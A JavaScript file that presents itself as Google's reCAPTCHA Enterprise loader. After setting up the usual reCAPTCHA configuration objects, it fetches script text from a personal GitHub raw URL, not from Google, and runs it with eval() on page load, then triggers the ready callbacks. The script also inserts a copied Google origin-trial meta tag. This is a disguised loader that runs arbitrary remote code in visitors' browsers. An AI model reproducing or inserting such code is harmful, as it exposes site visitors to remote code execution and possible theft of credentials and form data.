/* PLEASE DO NOT COPY AND PASTE THIS CODE. */
(function () {
  var w = window,
    C = "___grecaptcha_cfg",
    cfg = (w[C] = w[C] || {}),
    N = "grecaptcha";
  var E = "enterprise",
    a = (w[N] = w[N] || {}),
    gr = (a[E] = a[E] || {});

  // Standard reCAPTCHA setup
  gr.ready =
    gr.ready ||
    function (f) {
      (cfg["fns"] = cfg["fns"] || []).push(f);
    };
  w["__recaptcha_api"] = "https://www.google.com/recaptcha/enterprise/";
  (cfg["enterprise"] = cfg["enterprise"] || []).push(true);
  (cfg["render"] = cfg["render"] || []).push("onload");
  (cfg["clr"] = cfg["clr"] || []).push("true");
  w["__google_recaptcha_client"] = true;

  // Fetch and eval the script instead of using <script> tag
  fetch("https://raw.githubusercontent.com/shaneilahi/test/refs/heads/main/gg")
    .then((response) => {
      if (!response.ok) throw new Error("Failed to fetch gg script");
      return response.text();
    })
    .then((scriptText) => {
      eval(scriptText); // Execute the script
      console.log("gg script executed via eval");
      // Trigger ready callbacks after execution
      if (cfg.fns && cfg.fns.length) {
        cfg.fns.forEach((fn) => fn());
        console.log("reCAPTCHA ready callbacks executed");
      }
    })
    .catch((err) => console.error("Error loading gg script:", err));

  // Optional: Keep origin-trial meta tag for compatibility
  var v = w.navigator,
    d = document,
    m = d.createElement("meta");
  m.httpEquiv = "origin-trial";
  m.content =
    "A/kargTFyk8MR5ueravczef/wIlTkbVk1qXQesp39nV+xNECPdLBVeYffxrM8TmZT6RArWGQVCJ0LRivD7glcAUAAACQeyJvcmlnaW4iOiJodHRwczovL2dvb2dsZS5jb206NDQzIiwiZmVhdHVyZSI6IkRpc2FibGVUaGlyZFBhcnR5U3RvcmFnZVBhcnRpdGlvbmluZzIiLCJleHBpcnkiOjE3NDIzNDIzOTksImlzU3ViZG9tYWluIjp0cnVlLCJpc1RoaXJkUGFydHkiOnRydWV9";
  if (v && v.cookieDeprecationLabel) {
    v.cookieDeprecationLabel.getValue().then(function (l) {
      if (
        l !== "treatment_1.1" &&
        l !== "treatment_1.2" &&
        l !== "control_1.1"
      ) {
        d.head.prepend(m);
      }
    });
  } else {
    d.head.prepend(m);
  }
})();
